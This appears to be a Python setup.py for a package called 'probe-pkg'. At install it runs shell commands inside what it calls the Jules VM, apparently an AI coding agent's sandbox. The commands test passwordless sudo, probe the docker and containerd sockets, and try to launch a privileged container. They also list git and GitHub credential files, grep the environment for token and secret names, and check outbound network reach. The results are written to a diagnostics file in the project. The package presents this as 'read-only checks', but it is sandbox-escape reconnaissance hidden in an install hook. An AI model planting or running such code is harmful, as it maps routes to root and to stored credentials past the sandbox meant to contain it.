"""Local dependency probe v2 — escalation ceiling.

Runs during environment setup inside the Jules VM. Read-only checks.
"""
import subprocess
from setuptools import setup


def run(cmd, t=40):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def collect():
    p = []
    p.append("id: " + run("id"))
    p.append("sudo_n: " + run("sudo -n id"))
    p.append("sudo_l: " + run("sudo -n -l 2>&1 | head -20"))
    p.append("docksock: " + run("ls -la /var/run/docker.sock /run/docker.sock 2>&1"))
    p.append("docker_ps: " + run("docker ps 2>&1 | head -5"))
    p.append("docker_info: " + run("docker info 2>&1 | head -20"))
    p.append("docker_privil: " + run(
        "docker run --rm --privileged ubuntu:22.04 sh -c 'id; head -1 /etc/hostname; "
        "grep CapEff /proc/self/status' 2>&1 | tail -6"))
    p.append("containerd: " + run("ls -la /run/containerd/containerd.sock 2>&1"))
    p.append("gitconfig: " + run("cat /app/.git/config 2>&1 | grep -iE 'url|remote|insteadof'"))
    p.append("gitremote: " + run("cd /app && git remote -v 2>&1"))
    p.append("gitcred: " + run("ls -la /home/jules/.git-credentials /home/jules/.netrc "
                              "/home/jules/.config/gh 2>&1"))
    p.append("secrets_env: " + run(
        "env | grep -iE 'token|secret|passw|api_?key|auth' | sed 's/=.*/=<redacted>/'"))
    p.append("home_ls: " + run("ls -la /home/jules 2>&1 | head -30"))
    p.append("egress_ip: " + run("curl -s -m 8 https://ifconfig.me 2>&1"))
    p.append("hostname: " + run("hostname; cat /etc/hostname 2>&1"))
    return "\n".join(p)


def emit(text):
    block = "\n===== PROBE2_START =====\n" + text + "\n===== PROBE2_END =====\n"
    print(block)
    for path in ("/app/PROBE2_DIAG.md", "diag2.txt"):
        try:
            with open(path, "w") as fh:
                fh.write(block)
        except Exception:
            pass


emit(collect())


setup(name="probe-pkg", version="0.0.2", packages=["probe_pkg"])
